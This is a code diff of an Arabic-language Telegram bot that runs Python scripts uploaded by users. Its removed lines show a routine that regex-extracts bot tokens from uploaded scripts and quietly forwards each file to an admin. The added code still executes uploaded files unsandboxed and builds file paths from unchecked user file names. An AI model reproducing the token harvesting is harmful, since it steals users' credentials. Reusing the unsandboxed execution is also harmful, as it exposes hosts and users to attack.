@@ -75,28 +75,15 @@ def send_welcome(message):
 
     markup = types.InlineKeyboardMarkup()
     upload_button = types.InlineKeyboardButton('رفع ملف بوت', callback_data='upload')
-    dev_channel_button = types.InlineKeyboardButton('قناة المطور', url='https://t.me/Viptofey')
-    speed_button = types.InlineKeyboardButton('سرعة البوت', callback_data='speed')
-    markup.add(upload_button)
-    markup.add(speed_button, dev_channel_button)
-    bot.send_message(message.chat.id, f"مرحباً، {message.from_user.first_name}! يمكنك استخدام الأزرار أدناه للتحكم:", reply_markup=markup)
-
-@bot.callback_query_handler(func=lambda call: call.data == 'speed')
-def bot_speed_info(call):
-    try:
-        start_time = time.time()
-        response = requests.get(f'https://api.telegram.org/bot{TOKEN}/getMe')
-        latency = time.time() - start_time
-        if response.ok:
-            bot.send_message(call.message.chat.id, f"سرعة البوت: {latency:.2f} ثانية.")
-        else:
-            bot.send_message(call.message.chat.id, "فشل في الحصول على سرعة البوت.")
-    except Exception as e:
-        bot.send_message(call.message.chat.id, f"حدث خطأ أثناء فحص سرعة البوت: {e}")
+    running_files_button = types.InlineKeyboardButton('عرض الملفات قيد التشغيل', callback_data='running_files')
+    dev_channel_button = types.InlineKeyboardButton('قناة المطور', url='https://t.me/M1telegramM1')
+    markup.add(upload_button, running_files_button)
+    markup.add(dev_channel_button)
+    bot.send_message(message.chat.id, f"مرحباً، {message.from_user.first_name}! يمكنك استخدام الأزرار أدناه للتحكم في الملفات التي قمت برفعها:", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == 'upload')
 def ask_to_upload_file(call):
-    bot.send_message(call.message.chat.id, "من فضلك، أرسل الملف الذي تريد رفعه.")
+    bot.send_message(call.message.chat.id, "من فضلك، أرسل الملف الذي تريد رفعه. يمكنك تشغيل حتى 5 ملفات.")
 
 @bot.message_handler(content_types=['document'])
 def handle_file(message):
@@ -106,59 +93,33 @@ def handle_file(message):
         ask_for_subscription(message.chat.id)
         return
 
+    cursor.execute("SELECT COUNT(*) FROM files WHERE user_id = %s", (user_id,))
+    file_count = cursor.fetchone()[0]
+
+    if file_count >= 5:
+        bot.send_message(message.chat.id, "لقد وصلت إلى الحد الأقصى لعدد الملفات التي يمكنك تشغيلها (5 ملفات).")
+        return
+
     try:
         file_id = message.document.file_id
         file_info = bot.get_file(file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         file_name = message.document.file_name
 
-        if file_name.endswith('.zip'):
-            with tempfile.TemporaryDirectory() as temp_dir:
-                zip_folder_path = os.path.join(temp_dir, file_name.split('.')[0])
+        if not file_name.endswith('.py'):
+            bot.reply_to(message, "يرجى إرسال ملفات بايثون فقط.")
+            return
 
-                zip_path = os.path.join(temp_dir, file_name)
-                with open(zip_path, 'wb') as new_file:
-                    new_file.write(downloaded_file)
-                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
-                    zip_ref.extractall(zip_folder_path)
+        script_path = os.path.join(uploaded_files_dir, f"{user_id}_{file_name}")
+        with open(script_path, 'wb') as new_file:
+            new_file.write(downloaded_file)
 
-                final_folder_path = os.path.join(uploaded_files_dir, file_name.split('.')[0])
-                if not os.path.exists(final_folder_path):
-                    os.makedirs(final_folder_path)
-
-                for root, dirs, files in os.walk(zip_folder_path):
-                    for file in files:
-                        src_file = os.path.join(root, file)
-                        dest_file = os.path.join(final_folder_path, file)
-                        shutil.move(src_file, dest_file)
-
-                bot_py_path = os.path.join(final_folder_path, 'bot.py')
-                run_py_path = os.path.join(final_folder_path, 'run.py')
-
-                if os.path.exists(run_py_path):
-                    run_script(run_py_path, message.chat.id, final_folder_path, file_name, message)
-                elif os.path.exists(bot_py_path):
-                    run_script(bot_py_path, message.chat.id, final_folder_path, file_name, message)
-                else:
-                    bot.send_message(message.chat.id, f"لم أتمكن من العثور على bot.py أو run.py. أرسل اسم الملف الرئيسي لتشغيله:")
-                    bot_scripts[message.chat.id] = {'folder_path': final_folder_path}
-                    bot.register_next_step_handler(message, get_custom_file_to_run)
-
-        else:
-            if not file_name.endswith('.py'):
-                bot.reply_to(message, "هذا البوت خاص برفع ملفات بايثون أو zip فقط.")
-                return
-
-            script_path = os.path.join(uploaded_files_dir, file_name)
-            with open(script_path, 'wb') as new_file:
-                new_file.write(downloaded_file)
-
-            run_script(script_path, message.chat.id, uploaded_files_dir, file_name, message)
+        run_script(script_path, message.chat.id, file_name, message)
 
     except Exception as e:
         bot.reply_to(message, f"حدث خطأ: {e}")
 
-def run_script(script_path, chat_id, folder_path, file_name, original_message):
+def run_script(script_path, chat_id, file_name, original_message):
     try:
         requirements_path = os.path.join(os.path.dirname(script_path), 'requirements.txt')
         if os.path.exists(requirements_path):
@@ -169,86 +130,51 @@ def run_script(script_path, chat_id, folder_path, file_name, original_message):
         process = subprocess.Popen(['python3', script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         bot_scripts[chat_id] = {'process': process}
 
-        token = extract_token_from_script(script_path)
-        if token:
-            bot_info = requests.get(f'https://api.telegram.org/bot{token}/getMe').json()
-            bot_username = bot_info['result']['username']
-
-            user_info = f"@{original_message.from_user.username}" if original_message.from_user.username else str(original_message.from_user.id)
-            caption = f"قام المستخدم {user_info} برفع ملف بوت جديد. معرف البوت: @{bot_username}"
-            bot.send_document(ADMIN_ID, open(script_path, 'rb'), caption=caption)
-
-            markup = types.InlineKeyboardMarkup()
-            stop_button = types.InlineKeyboardButton(f"إيقاف {file_name}", callback_data=f'stop_{chat_id}_{file_name}')
-            delete_button = types.InlineKeyboardButton(f"حذف {file_name}", callback_data=f'delete_{chat_id}_{file_name}')
-            markup.add(stop_button, delete_button)
-            bot.send_message(chat_id, f"استخدم الأزرار أدناه للتحكم في البوت:", reply_markup=markup)
-        else:
-            bot.send_message(chat_id, f"تم تشغيل البوت بنجاح! ولكن لم أتمكن من جلب معرف البوت.")
-            bot.send_document(ADMIN_ID, open(script_path, 'rb'), caption=f"قام المستخدم {user_info} برفع ملف بوت جديد، ولكن لم أتمكن من جلب معرف البوت.")
-
         cursor.execute("INSERT INTO files (user_id, file_name, file_path, is_running) VALUES (%s, %s, %s, %s)", (original_message.from_user.id, file_name, script_path, True))
         connection.commit()
+
+        bot.send_message(chat_id, f"تم تشغيل البوت {file_name} بنجاح!")
 
     except Exception as e:
         bot.send_message(chat_id, f"حدث خطأ أثناء تشغيل البوت: {e}")
 
-def extract_token_from_script(script_path):
-    try:
-        with open(script_path, 'r') as script_file:
-            file_content = script_file.read()
+@bot.callback_query_handler(func=lambda call: call.data == 'running_files')
+def show_running_files(call):
+    user_id = call.from_user.id
+    cursor.execute("SELECT file_name FROM files WHERE user_id = %s AND is_running = TRUE", (user_id,))
+    files = cursor.fetchall()
 
-            token_match = re.search(r"['\"]([0-9]{9,10}:[A-Za-z0-9_-]+)['\"]", file_content)
-            if token_match:
-                return token_match.group(1)
-            else:
-                print(f"[WARNING] لم يتم العثور على توكن في {script_path}")
-    except Exception as e:
-        print(f"[ERROR] فشل في استخراج التوكن من {script_path}: {e}")
-    return None
+    if not files:
+        bot.send_message(call.message.chat.id, "لا توجد ملفات قيد التشغيل حالياً.")
+        return
 
-def get_custom_file_to_run(message):
-    try:
-        chat_id = message.chat.id
-        folder_path = bot_scripts[chat_id]['folder_path']
-        custom_file_path = os.path.join(folder_path, message.text)
+    markup = types.InlineKeyboardMarkup()
+    for file in files:
+        file_name = file[0]
+        markup.add(types.InlineKeyboardButton(file_name, callback_data=f'stop_{file_name}'))
 
-        if os.path.exists(custom_file_path):
-            run_script(custom_file_path, chat_id, folder_path, message.text, message)
-        else:
-            bot.send_message(chat_id, f"الملف الذي حددته غير موجود. تأكد من الاسم وحاول مرة أخرى.")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"حدث خطأ: {e}")
+    bot.send_message(call.message.chat.id, "الملفات قيد التشغيل:", reply_markup=markup)
 
-@bot.callback_query_handler(func=lambda call: True)
-def callback_query(call):
-    chat_id = call.message.chat.id
-    file_name = call.data.split('_')[-1]
+@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
+def stop_and_delete_file(call):
+    user_id = call.from_user.id
+    file_name = call.data.split('_', 1)[1]
 
-    if 'stop' in call.data:
-        stop_running_bot(chat_id, file_name)
-    elif 'delete' in call.data:
-        delete_uploaded_file(chat_id, file_name)
-
-def stop_running_bot(chat_id, file_name):
-    if chat_id in bot_scripts and bot_scripts[chat_id]['process']:
-        bot_scripts[chat_id]['process'].terminate()
-        cursor.execute("UPDATE files SET is_running = FALSE WHERE user_id = %s AND file_name = %s", (chat_id, file_name))
-        connection.commit()
-        bot.send_message(chat_id, "تم إيقاف تشغيل البوت.")
-    else:
-        bot.send_message(chat_id, "لا يوجد بوت يعمل حالياً.")
-
-def delete_uploaded_file(chat_id, file_name):
-    cursor.execute("SELECT file_path FROM files WHERE user_id = %s AND file_name = %s", (chat_id, file_name))
+    cursor.execute("SELECT file_path FROM files WHERE user_id = %s AND file_name = %s", (user_id, file_name))
     file_path = cursor.fetchone()
+
     if file_path and os.path.exists(file_path[0]):
+        # إيقاف العملية إذا كانت قيد التشغيل
+        if user_id in bot_scripts and bot_scripts[user_id]['process']:
+            bot_scripts[user_id]['process'].terminate()
+            del bot_scripts[user_id]
+
         os.remove(file_path[0])
-        cursor.execute("DELETE FROM files WHERE user_id = %s AND file_name = %s", (chat_id, file_name))
+        cursor.execute("DELETE FROM files WHERE user_id = %s AND file_name = %s", (user_id, file_name))
         connection.commit()
-        bot.send_message(chat_id, "تم حذف الملفات المتعلقة بالبوت.")
+        bot.send_message(call.message.chat.id, f"تم إيقاف وحذف الملف {file_name}.")
     else:
-        bot.send_message(chat_id, "الملفات غير موجودة.")
+        bot.send_message(call.message.chat.id, "لم يتم العثور على الملف.")
 
 initialize_database()
 bot.infinity_polling()
